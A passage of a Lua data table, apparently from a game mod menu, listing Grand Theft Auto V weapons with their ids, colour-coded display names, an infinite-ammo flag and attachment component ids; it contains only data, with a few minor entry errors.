            id = "weapon_appistol", name = "AP Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_APPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_APPISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, StunGun = {
            id = "weapon_stungun", name = "~h~~r~> ~s~Stun Gun", bInfAmmo = false, mods = {}
        }, Pistol50 = {
            id = "weapon_pistol50", name = "~h~~r~> ~s~Pistol .50", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL50_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL50_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, SNSPistol = {
            id = "weapon_snspistol", name = "~h~~r~> ~s~SNS Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SNSPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_CLIP_02"
                    }
                }
            }
        }, SNSPistolMkII = {
            id = "weapon_snspistol_mk2", name = "~h~~r~> ~s~SNS Pistol Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_03"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP_02"
                    }, {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, HeavyPistol = {
            id = "weapon_heavypistol", name = "~h~~r~> ~s~Heavy Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, VintagePistol = {
            id = "weapon_vintagepistol", name = "~h~~r~> ~s~Vintage Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_02"
                    }
                }, BarrelAttachments = {
                    {
                        "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, FlareGun = {
            id = "weapon_flaregun", name = "~h~~r~> ~s~Flare Gun", bInfAmmo = false, mods = {}
        }, MarksmanPistol = {
            id = "weapon_marksmanpistol", name = "~h~~r~> ~s~Marksman Pistol", bInfAmmo = false, mods = {}
        }, HeavyRevolver = {
            id = "weapon_revolver", name = "~h~~r~> ~s~Heavy Revolver", bInfAmmo = false, mods = {}
        }, HeavyRevolverMkII = {
            id = "weapon_revolver_mk2", name = "~h~~r~> ~s~Heavy Revolver Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP_03"
                    }
                }
            }
        }, DoubleActionRevolver = {
            id = "weapon_doubleaction", name = "~h~~r~> ~s~Double Action Revolver", bInfAmmo = false, mods = {}
        }, UpnAtomizer = {
            id = "weapon_raypistol", name = "~h~~r~> ~s~Up-n-Atomizer", bInfAmmo = false, mods = {}
        }
    }, SMG = {
        MicroSMG = {
            id = "weapon_microsmg", name = "~h~~r~> ~s~Micro SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MICROSMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MICROSMG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }
            }
        }, SMG = {
            id = "weapon_smg", name = "~h~~r~> ~s~SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SMG_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_SMG_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, SMGMkII = {
            id = "weapon_smg_mk2", name = "~h~~r~> ~s~SMG Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SMG_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SMG_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SB_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SB_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }
            }
        }, AssaultSMG = {
            id = "weapon_assaultsmg", name = "~h~~r~> ~s~Assault SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }
            }
        }, CombatPDW = {
            id = "weapon_combatpdw", name = "~h~~r~> ~s~Combat PDW", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATPDW_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATPDW_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_COMBATPDW_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, MachinePistol = {
            id = "weapon_machinepistol", name = "~h~~r~> ~s~Machine Pistol ", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_03"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, MiniSMG = {
            id = "weapon_minismg", name = "~h~~r~> ~s~Mini SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MINISMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MINISMG_CLIP_02"
                    }
                }
            }
        }, UnholyHellbringer = {
            id = "weapon_raycarbine", name = "~h~~r~> ~s~Unholy Hellbringer", bInfAmmo = false, mods = {}
        }
    }, Shotguns = {
        PumpShotgun = {
            id = "weapon_pumpshotgun", name = "~h~~r~> ~s~Pump Shotgun", bInfAmmo = false, mods = {
                Flashlight = {
                    {
                        "name = Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP"
                    }
                }
            }
        }, PumpShotgunMkII = {
            id = "weapon_pumpshotgun_mk2", name = "~h~~r~> ~s~Pump Shotgun Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
                    }, {
                        name = "~h~~r~> ~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
                    }
                }
            }
        }, SawedOffShotgun = {
            id = "weapon_sawnoffshotgun", name = "~h~~r~> ~s~Sawed-Off Shotgun", bInfAmmo = false, mods = {}
        }, AssaultShotgun = {
            id = "weapon_assaultshotgun", name = "~h~~r~> ~s~Assault Shotgun", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, BullpupShotgun = {
            id = "weapon_bullpupshotgun", name = "~h~~r~> ~s~Bullpup Shotgun", bInfAmmo = false, mods = {
                Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, Musket = {
            id = "weapon_musket", name = "~h~~r~> ~s~Musket", bInfAmmo = false, mods = {}
        }, HeavyShotgun = {
            id = "weapon_heavyshotgun", name = "~h~~r~> ~s~Heavy Shotgun", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, DoubleBarrelShotgun = {
            id = "weapon_dbshotgun", name = "~h~~r~> ~s~Double Barrel Shotgun", bInfAmmo = false, mods = {}
        }, SweeperShotgun = {
            id = "weapon_autoshotgun", name = "~h~~r~> ~s~Sweeper Shotgun", bInfAmmo = false, mods = {}
        }
    }, AssaultRifles = {
        AssaultRifle = {
            id = "weapon_assaultrifle", name = "~h~~r~> ~s~Assault Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, AssaultRifleMkII = {
            id = "weapon_assaultrifle_mk2", name = "~h~~r~> ~s~Assault Rifle Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_AR_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_AR_BARREL_0"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, CarbineRifle = {
            id = "weapon_carbinerifle", name = "~h~~r~> ~s~Carbine Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, CarbineRifleMkII = {
            id = "weapon_carbinerifle_mk2", name = "~h~~r~> ~s~Carbine Rifle Mk II ", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_CR_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_CR_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, AdvancedRifle = {
            id = "weapon_advancedrifle", name = "~h~~r~> ~s~Advanced Rifle ", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }
            }
        }, SpecialCarbine = {
            id = "weapon_specialcarbine", name = "~h~~r~> ~s~Special Carbine", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, SpecialCarbineMkII = {
            id = "weapon_specialcarbine_mk2", name = "~h~~r~> ~s~Special Carbine Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SC_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SC_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
